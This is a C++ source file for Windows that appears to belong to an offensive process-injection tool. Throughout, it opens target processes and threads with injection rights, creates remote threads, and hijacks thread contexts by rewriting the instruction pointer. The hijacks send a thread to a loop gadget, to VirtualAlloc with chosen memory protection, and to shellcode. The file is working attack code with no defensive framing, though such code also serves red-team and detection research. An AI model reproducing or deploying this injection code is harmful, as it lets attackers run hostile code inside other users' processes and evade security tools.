#include "ProcessThread.h"
#include <iostream> // For std::cerr, std::cout

HANDLE OpenTargetProcess(DWORD pid)
{
    DWORD desiredAccess = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
    HANDLE hProcess = OpenProcess(desiredAccess, FALSE, pid);
    if (!hProcess)
    {
        std::cerr << "[!] Failed to open target process. Error: " << GetLastError() << "\n";
        return NULL;
    }
    std::cout << "[*] Opened target process (PID=" << pid << ")\n";
    return hProcess;
}

HANDLE OpenTargetThread(DWORD tid)
{
    // THREAD_SET_CONTEXT is required for QueueUserAPC
    // THREAD_QUERY_INFORMATION might be useful for debugging/verification later
    DWORD desiredAccess = THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION;
    HANDLE hThread = OpenThread(desiredAccess, FALSE, tid);
    if (!hThread)
    {
        std::cerr << "[!] Failed to open target thread (TID=" << tid << "). Error: " << GetLastError() << "\n";
        return NULL;
    }
    std::cout << "[*] Opened target thread (TID=" << tid << ")\n";
    return hThread;
}

HANDLE CreateRemoteSleepThread(HANDLE hProcess, LPVOID pSleepLocal)
{
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pSleepLocal,
        (LPVOID)5000,
        0,
        NULL);
    if (!hThread)
    {
        std::cerr << "[!] Failed to CreateRemoteThread. Error: " << GetLastError() << "\n";
        return NULL;
    }
    DWORD tid = GetThreadId(hThread);
    std::cout << "[*] Created remote thread (TID=" << tid << "). Sleeping for 5s.\n";
    return hThread;
}

bool HijackThreadToLoop(HANDLE hThread, LPVOID pInfiniteLoopGadget, bool useSuspend)
{
    bool suspended = false;
    if (useSuspend)
    {
        std::cout << "[*] Suspending thread...\n";
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended = true;
        }
        else
        {
            std::cerr << "[!] SuspendThread failed. Error: " << GetLastError() << "\n";
            return false;
        }
    }

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    ctx.Rip = (DWORD_PTR)pInfiniteLoopGadget;
    if (!SetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] SetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    if (suspended)
    {
        std::cout << "[*] Resuming thread...\n";
        ResumeThread(hThread);
    }
    return true;
}

bool HijackThreadToVirtualAlloc(HANDLE hThread, LPVOID pVirtualAllocLocal, SIZE_T allocSize, DWORD allocPerm, bool useSuspend)
{
    bool suspended = false;
    if (useSuspend)
    {
        std::cout << "[*] Suspending thread...\n";
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended = true;
        }
        else
        {
            std::cerr << "[!] SuspendThread failed. Error: " << GetLastError() << "\n";
            return false;
        }
    }

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    ctx.Rip = (DWORD_PTR)pVirtualAllocLocal;
    ctx.Rcx = 0;                       // lpAddress
    ctx.Rdx = allocSize;               // dwSize
    ctx.R8 = MEM_COMMIT | MEM_RESERVE; // flAllocationType
    ctx.R9 = allocPerm;                // flProtect

    if (!SetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] SetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    if (suspended)
    {
        std::cout << "[*] Resuming thread...\n";
        ResumeThread(hThread);
    }
    return true;
}

bool HijackThreadToShellcode(HANDLE hThread, LPVOID pShellcodeAddr, bool useSuspend)
{
    bool suspended = false;
    if (useSuspend)
    {
        std::cout << "[*] Suspending thread...\n";
        if (SuspendThread(hThread) != (DWORD)-1)
        {
            suspended = true;
        }
        else
        {
            std::cerr << "[!] SuspendThread failed. Error: " << GetLastError() << "\n";
            return false;
        }
    }

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] GetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    ctx.Rip = (DWORD_PTR)pShellcodeAddr;

    if (!SetThreadContext(hThread, &ctx))
    {
        std::cerr << "[!] SetThreadContext failed. Error: " << GetLastError() << "\n";
        if (suspended)
            ResumeThread(hThread);
        return false;
    }

    if (suspended)
    {
        std::cout << "[*] Resuming thread...\n";
        ResumeThread(hThread);
    }
    return true;
}
